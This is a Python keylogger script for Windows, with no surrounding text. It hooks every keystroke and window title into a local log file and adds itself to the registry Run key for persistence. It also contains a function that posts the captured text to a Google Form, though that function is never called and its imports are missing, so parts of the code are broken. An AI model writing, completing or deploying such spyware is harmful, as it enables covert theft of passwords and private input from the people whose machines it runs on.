#!/usr/bin/python

import pyHook
import pythoncom
import os
import subprocess

def OnKey(event):
    global window
    file = open('C:\\captura\\captura.txt', 'a')
    if event.WindowName != window:
        window = event.WindowName
        file.write('\n' + window + ' - ' + str(event.Time) + '\n')
    elif event.Ascii == 13:
        file.write('<ENTER>\n')
    elif event.Ascii == 8:
        file.write(' <BACK SPACE> ')
    elif event.Ascii == 9:
        file.write(' <TAB>')
    else:
        file.write(chr(event.Ascii))
        file.close()

def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/d/1FAIpQLScd_RtAoqPf0Nd84lXpFC0rh-loEuPpWFnfpt8khmXmKCoOWQ" #Specify Google Form URL here
        klog={'entry.1145925058':data} #Specify the Field Name here
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except Exception as e:
            print e
    return True

def persis():
    try:
        conv = os.path.realpath(__file__).replace('.py', '.exe')
        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True)
    except Exception as e:
        print e

window = None
persis()
try:
    os.mkdir('C:\\captura')
except:
    pass

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKey
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

